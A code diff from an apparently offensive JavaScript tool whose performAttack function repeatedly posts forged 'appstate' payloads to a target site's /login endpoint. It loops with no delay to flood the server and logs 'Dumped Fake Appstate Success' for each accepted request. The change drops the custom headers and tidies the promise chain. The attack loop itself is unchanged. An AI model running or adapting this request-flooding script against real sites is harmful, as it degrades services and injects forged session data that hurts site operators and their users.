@@ -145,18 +145,15 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
     axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login",
         {
             state: fakeState(),
-        },
-        {
-            headers: headersForRequest,
-        }
-    ).then((response) => {
-            if (response.status === 200) {
-                console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"));
-            }
-            requestsSent++;
-            checkCompletion(requestsSent);
-            setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
         })
+    .then((response) => {
+        if (response.status === 200) {
+            console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"));
+        }
+        requestsSent++;
+        checkCompletion(requestsSent);
+        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    })
     .catch((err) => {
         requestsSent++;
         checkCompletion(requestsSent);
